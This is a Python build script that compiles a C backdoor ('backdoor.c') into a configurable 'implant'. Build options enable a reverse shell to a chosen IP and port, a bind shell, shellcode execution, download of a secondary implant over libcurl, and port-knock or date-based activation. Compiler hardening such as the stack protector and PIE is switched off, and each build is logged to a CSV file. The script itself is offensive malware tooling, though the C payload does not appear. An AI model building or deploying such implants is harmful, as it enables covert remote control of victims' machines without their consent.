import datetime
import argparse
import binascii
import os
import subprocess
import csv
import random

parser = argparse.ArgumentParser("python compiler.py", usage='%(prog)s [-o fileName] [-p listener] [-intfc eth0] [-act SECRET_PORTS] [-key 200,300,400] [-atkSc] [-a x64] [-p linux] [-ip 192.160.1.100] [-revip 192.168.2.132] [-revport 1337] [-strip]')

parser.add_argument("-d", "--debug", action="store_true",
                    help="compile with debugging")
parser.add_argument("-ip", "--ipAddress",type=str,
                    help="target address", metavar='', default="unknown")
parser.add_argument("-do", "--domain", type=str,
                    help="target domain", metavar='', default="unknown")
parser.add_argument("-p", "--platform",type=str, metavar='',
                    help="platform", default="unknown")
parser.add_argument("-a", "--architecture",type=str, metavar='',
                    help="system architecture", default="unknown")
parser.add_argument("-os", "--os",type=str, metavar='',
                    help="operating system", default="unknown")
parser.add_argument("-vn", "--versionNumber",type=str, metavar='',
                    help="version no.", default="unknown")
parser.add_argument("-pay", "--payload",type=str, metavar='',
                    help="payload type", default="unknown")
parser.add_argument("-o", "--outputName",type=str, metavar='',
                    help="output filename", default="implant")
parser.add_argument("-intfc", "--interface",type=str, metavar='',
                    help="listener interface")
parser.add_argument("-act", "--activate", type=str, metavar='',
                    help="activation method")
parser.add_argument("-key", "--key",type=str, metavar='',
                    help="activation key")
parser.add_argument("-size", "--size",type=str, metavar='',
                    help="number of knocks to listen for")
parser.add_argument("-trig", "--trigger",type=str, metavar='',
                    help="target URL to check")
parser.add_argument("-delayT", "--timeDelay", type=str, metavar='',
                    help="time in between checks")
parser.add_argument("-delayD", "--dateDelay", type=str, metavar='',
                    help="sleep until this date")
parser.add_argument("-atkD", "--downloadURL",type=str, metavar='',
                    help="download file from this url")
parser.add_argument("-atkB", "--bang", action="store_true",
                    help="execute bang attack function")
parser.add_argument("-atkSc", "--loadShellcode", action="store_true",
                    help="execute shellcode")
parser.add_argument("-atkR", "--reverseShell",action="store_true",
                    help="run a reverse shell")
parser.add_argument("-revip", "--reverseIP",type=str, metavar='',
                    help="reverse shell IP")
parser.add_argument("-revport", "--reversePort",type=str, metavar='',
                    help="reverse shell Port")
parser.add_argument("-atkBS", "--bindShell",action="store_true",
                    help="run a bind shell")
parser.add_argument("-bindport", "--bindPort",type=str, metavar='',
                    help="bind shell Port")
parser.add_argument("-per", "--persistence",type=str, metavar='',
                    help="persistence mechanism (not implemented)")
parser.add_argument("-notes", "--notes",type=str, metavar='',
                    help="notes", default="No Notes")
parser.add_argument("-strip", "--strip", action="store_true",
                    help="strip the binary")
parser.add_argument("-static", "--static", action="store_true",
                    help="statically link the binary")
parser.add_argument("-secImp", "--secImp", action="store_true",
                    help="download secondary implant using libcurl")
parser.add_argument("-knock", "--knock", action="store_true",
                    help="knock on ports")
parser.add_argument("-valTime", "--valTime",action="store_true",
                    help="validate time")
parser.add_argument("-stDate", "--stDate",type=str, metavar='',
                    help="Start date")
parser.add_argument("-endDate", "--endDate",type=str, metavar='',
                    help="end date validator")

args = parser.parse_args()
#print(args)

cmd = ["gcc", "-Wall", "backdoor.c", "-o", args.outputName, "-no-pie", "-Wl,-z,norelro", "-fno-stack-protector", "-lcurl", "-lm"]

arg = str(args.ipAddress)
#DEBUG
if args.debug:
    cmd.insert(3, "-D DEBUG=1")
    cmd.insert(3, "-g")
#DATEs
if args.valTime:
    cmd.insert(3,"-D START_DATE=\"" + args.stDate + "\"")
    cmd.insert(3,"-D END_DATE=\"" + args.endDate + "\"")
    cmd.insert(3,"-D VALID_TIME=1")
#IPADDRESS
if args.ipAddress != "unknown":
    cmd.insert(3, "-D VALID_IP=\"" + args.ipAddress +"\"")
#DOMAIN
if args.domain != "unknown":
    cmd.insert(3, "-D DOMAIN=\"" + args.domain +"\"")
#PLATFORM
if args.platform != "unknown":
    cmd.insert(3, "-D PLATFORM=\"" + args.platform +"\"")
#ARCHITECTURE
if args.architecture != "unknown":
    cmd.insert(3, "-D ARCH=\"" + args.architecture +"\"")
#OS
if args.os != "unknown":
    cmd.insert(3, "-D VALID_SYSNAME=\"" + args.os +"\"")
#VERSION_NUMBER
if args.versionNumber != "unknown":
    cmd.insert(3, "-D VERSION_NUM=\"" + args.versionNumber +"\"")
#PAYLOAD
if args.payload != "unknown":
    cmd.insert(3, "-D PAYLOAD=\"" + args.payload +"\"")
#INTERFACE
if args.interface is not None:
    cmd.insert(3, "-D INTERFACE=\"" + args.interface +"\"")
#ACTIVATE
if args.activate is not None:
    cmd.insert(3, "-D ACTIVATE=\"" + args.activate +"\"")
#SIZE
if args.size is not None:
    cmd.insert(3, "-D SIZE=\"" + args.size +"\"")
#TRIGGER
if args.trigger is not None:
    cmd.insert(3, "-D TRIGGER=\"" + args.trigger +"\"")
#DELAY
if args.timeDelay is not None:
    cmd.insert(3, "-D TIMEDELAY=\"" + args.timeDelay +"\"")
#DATEDELAY
if args.dateDelay is not None:
    cmd.insert(3, "-D DATEDELAY=\"" + args.dateDelay +"\"")
#DOWNLOADURL
if args.downloadURL is not None:
    cmd.insert(3, "-D DOWNLOADURL=\"" + args.downloadURL +"\"")
#BANG
if args.bang:
    cmd.insert(3, "-D BANG=1")
#LOADSHELLCODE
if args.loadShellcode:
    cmd.insert(3, "-D LOADSHELLCODE=1")
#REVERSESHELL
if args.reverseShell:
    cmd.insert(3, "-D REVERSESHELL=1")
#REVERSEIP
if args.reverseIP is not None:
    cmd.insert(3, "-D REVERSEIP=\"" + str(args.reverseIP) +"\"")
#REVERSEPORT
if args.reversePort is not None:
    cmd.insert(3, "-D REVERSEPORT=\"" + args.reversePort +"\"")
#BINDSHELL
if args.bindShell:
    cmd.insert(3, "-D BINDSHELL=1")
#BINDPORT
if args.bindPort is not None:
    cmd.insert(3, "-D BINDPORT=\"" + args.bindPort + "\"")
#PERSIST
if args.persistence is not None:
    cmd.insert(3, "-D PERSIST=\"" + args.persistence +"\"")
#NOTES
if args.notes != "No Notes":
    cmd.insert(3, "-D NOTES=\"" + args.notes +"\"")
#STRIP
if args.strip:
    cmd.insert(3, "-D STRIP=1")
#STATIC
if args.static:
    cmd.insert(3, "-D STATIC=1")
#SECONDARYIMPLANT
if args.secImp:
    #cmd.insert(3, "-lcurl")
    cmd.insert(3, "-D SECIMP")

listOfNumbers = []
if args.knock:
    count = 0
    #listOfNumbers = [] 
    key = 34567
    target = key
    number = 4
    while (number-1) > count: # loop generates n-1 random numbers 
            temp = random.randint(100,int(round(key/number))) #that add up to a number less than the key
            listOfNumbers.append(temp)
            count += 1
    print(listOfNumbers)
    #MULTI_KNOCK
    listnum = []
    for i in listOfNumbers:
        listnum.append(i)

    cmd.insert(3, "-D MULTI_KNOCK={" + str(listnum).strip(' []') + "}")

    cmd.insert(3,"-D NUM_PORTS=" + str(len(listOfNumbers)))
    
cmd.insert(3,"-lpcap")
print(cmd)

subprocess.run(cmd)
#subprocess.run("./implant")



with open('log.csv', mode='+a') as log_file:

    log_writer = csv.writer(log_file, delimiter='\t', quotechar='"', quoting=csv.QUOTE_MINIMAL)
    if (log_writer is not None):
        fieldnamesList = ["datetime", "ipAddress","SECRET_PORTS", "domain", "architecture", "platform", "os", "key", "dateDelay", "timeDelay", "persistence", "loadShellcode", "reverseShell", "reverseIP", "reversePort"]
        log_writer.writerow(fieldnamesList)

    log_writer.writerow([str(datetime.datetime.now()), str(args.ipAddress), str(listOfNumbers), str(args.domain), str(args.architecture), str(args.platform), str(args.os), str(args.key), str(args.dateDelay), str(args.timeDelay), str(args.persistence), str(args.loadShellcode), str(args.reverseShell), str(args.reverseIP), str(args.reversePort)])






